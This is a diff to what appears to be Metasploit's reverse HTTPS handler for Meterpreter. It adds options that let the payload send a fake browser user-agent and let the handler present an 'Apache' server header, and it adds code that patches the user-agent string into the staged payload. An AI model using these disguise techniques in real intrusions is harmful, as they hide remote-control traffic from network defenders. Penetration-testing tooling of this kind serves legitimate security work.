@@ -99,8 +99,10 @@ module ReverseHttps
 		register_advanced_options(
 			[
 				OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),
-				OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcible shut down', (24*3600*7)]),
-				OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300])
+				OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcibly shut down', (24*3600*7)]),
+				OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300]),
+				OptString.new('MeterpreterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
+				OptString.new('MeterpreterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ])				
 			], Msf::Handler::ReverseHttps)
 	end
 
@@ -135,6 +137,8 @@ module ReverseHttps
 			comm,
 			datastore['SSLCert']
 		)
+
+		self.service.server_name = datastore['MeterpreterServerName']
 
 		# Create a reference to ourselves
 		obj = self
@@ -241,6 +245,15 @@ protected
 
 				blob = obj.stage_payload
 
+				# Replace the user agent string with our option
+				i = blob.index("METERPRETER_UA\x00")
+				if i
+					str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
+					blob[i, str.length] = str
+					print_status("Patched user-agent at offset #{i}...")
+				end
+				
+				
 				# Replace the transport string first (TRANSPORT_SOCKET_SSL
 				i = blob.index("METERPRETER_TRANSPORT_SSL")
 				if i
